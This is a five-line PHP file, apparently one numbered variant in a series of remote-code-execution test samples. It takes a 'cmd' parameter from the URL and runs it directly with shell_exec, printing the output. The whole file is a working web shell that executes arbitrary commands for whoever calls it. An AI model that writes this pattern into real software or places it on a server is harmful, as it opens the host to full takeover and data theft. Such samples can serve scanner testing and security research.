<?php
// RCE test variation #896
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>